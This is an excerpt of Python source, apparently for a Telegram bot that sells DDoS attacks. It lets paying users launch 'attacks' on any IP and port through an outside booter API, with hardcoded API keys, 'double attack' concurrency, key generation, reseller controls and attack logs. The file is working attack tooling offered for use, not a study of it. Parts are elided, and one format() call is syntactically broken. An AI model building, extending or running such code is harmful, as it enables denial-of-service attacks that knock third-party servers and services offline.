...
# ============= 2 API KEYS - BOTH WILL WORK =============
API_KEYS = [
    "LMII0G",    # First API Key
    "4SLH33"     # Second API Key
]

# Create API list with both keys (4 slots per key = total 8 concurrent attacks)
API_LIST = []
for key in API_KEYS:
    for i in range(4):  # 4 concurrent attacks per key
        API_LIST.append(f"https://app.teamc2.xyz/api/attack?api_key={key}&target={{ip}}&port={{port}}&time={{time}}&concurrent=1")

print(f"✅ Total API Slots: {len(API_LIST)} (2 Keys x 4 Slots = 8 Concurrent Attacks)")
...
def get_concurrent_limit():
    return get_setting('concurrent_limit', 8)
...
def log_attack(user_id, username, target, port, duration, api_key_used=None):
...
✅ 2 API Keys Active! (8 Concurrent Attacks)
...
• /doublechodo <ip> <port> <time> - Attack with BOTH APIs!'''
...
def handle_attack(message):
    ...
    try:
        ...
        # Get which API key is being used
        used_api_key = API_KEYS[api_index // 4] if api_index < len(API_LIST) else API_KEYS[0]
        ...
        def start_attack():
            try:
                ...
                log_attack(user_id, username, target, port, duration, used_api_key)
                bot.reply_to(message, f"⚡ Attack Started!\n\n🎯 Target: {target}:{port}\n⏱️ Time: {duration}s\n🔑 API Key: `{used_api_key}`\n📊 /status se check kro", parse_mode="Markdown")
                ...
                def call_api():
                    try:
                        ...
                        print(f"[API Key: {used_api_key}] Attack sent to {target}:{port} - Status: {response.status_code}")
                    except Exception as e:
                        print(f"[API Key: {used_api_key}] Error: {e}")
...
# DOUBLE ATTACK - Both APIs simultaneously!
@bot.message_handler(commands=["doublechodo"])
def double_attack_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    ...
    parts = message.text.split()
    if len(parts) != 4:
        bot.reply_to(message, "⚠️ Usage: /doublechodo <ip> <port> <time>\nExample: /doublechodo 1.1.1.1 80 60\n\n🔥 Isme DONO API keys ek saath attack karengi!")
        return
    ...
    try:
        ...
        bot.reply_to(message, f"🔥 DOUBLE ATTACK STARTED!\n\n🎯 Target: {target}:{port}\n⏱️ Time: {duration}s\n🔑 Using BOTH API Keys:\n   • API 1: LMII0G\n   • API 2: 4SLH33\n\n⚡ Double the power! 💪")
        
        # Attack with both APIs
        def hit_api(api_key, key_index):
            api_url = f"https://app.teamc2.xyz/api/attack?api_key={api_key}&target={target}&port={port}&time={duration}&concurrent=1"
            try:
                response = requests.get(api_url, timeout=10)
                print(f"[{api_key}] Attack to {target}:{port} - Status: {response.status_code}")
                log_attack(user_id, username, target, port, duration, api_key)
            except Exception as e:
                print(f"[{api_key}] Error: {e}")
        
        # Launch both attacks simultaneously
        threads = []
        for idx, api_key in enumerate(API_KEYS):
            t = threading.Thread(target=hit_api, args=(api_key, idx))
            t.start()
            threads.append(t)
        ...
        bot.reply_to(message, f"✅ DOUBLE ATTACK COMPLETE!\n\n🎯 Target: {target}:{port}\n⏱️ Duration: {duration}s\n🔑 Both APIs finished!")
...
def build_status_message(user_id):
    ...
    if user_attacks:
        for attack_info in user_attacks.values():
            ...
            if remaining > 0:
                ...
                response += f"│ 🔑 API: {attack_info.get('api_key', 'N/A')}\n"
    ...
    response += f"\n🔑 Active APIs: {len(API_KEYS)} (Total Slots: {len(API_LIST)})"
    if cooldown > 0:
        response += f"\n⏳ Cooldown: {cooldown}s"
    return response
...
# ============= RESELLER MANAGEMENT (Shortened for length) =============
...
def unblock_ip_command(message):
    ...
    if remove_blocked_ip(parts[1]):
        ...
        bot.reply_to(message, f"❌ {parts[1]} not found!")
...
def live_stats_command(message):
    ...
    response += f"• Active APIs: {len(API_KEYS)}\n"
...
def attack_logs_command(message):
    ...
    for i, log in enumerate(data["attack_logs"][-50:], 1):
        ...
        content += f"   API Key: {log.get('api_key', 'N/A')}\n"
...
def show_help(message):
    ...
    if is_owner(user_id):
        help_text = '''
👑 𝗢𝗪𝗡𝗘𝗥 𝗣𝗔𝗡𝗘𝗟 (2 APIs Active)

🔑 𝗞𝗘𝗬 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧:
• /gen <time> <count> - Keys generate
• /redeem <key> - Key redeem
• /mykey - Key details
• /delkey <key> - Key delete

⚡ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦:
• /chodo <ip> <port> <time> - Normal attack (1 API)
• /doublechodo <ip> <port> <time> - DOUBLE ATTACK (Both APIs!)
...
📊 Current: {len(API_KEYS)} APIs | {len(API_LIST)} Concurrent Slots
'''
    else:
        help_text = '''
🔐 𝗨𝗦𝗘𝗥 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦:
...
• /mykey - Key details dekho
• /status - Attack status dekho
• /chodo <ip> <port> <time> - Normal attack
• /doublechodo <ip> <port> <time> - DOUBLE POWER ATTACK!

Example: /chodo 1.1.1.1 80 60
Example: /doublechodo 1.1.1.1 80 60 (2x power!)
'''
    
    bot.reply_to(message, help_text.format(len(API_KEYS)=len(API_KEYS), len(API_LIST)=len(API_LIST)))
...
for i, key in enumerate(API_KEYS, 1):
    print(f"   🔑 API {i}: {key[:5]}...{key[-3:]}")
print(f"✅ Total Concurrent Slots: {len(API_LIST)} ( {len(API_KEYS)} keys x 4 slots each )")
...
print("="*60)
print("🎯 Commands:")
print("   • /chodo <ip> <port> <time> - Single API attack")
print("   • /doublechodo <ip> <port> <time> - DOUBLE API attack (MORE POWER!)")
print("="*60)
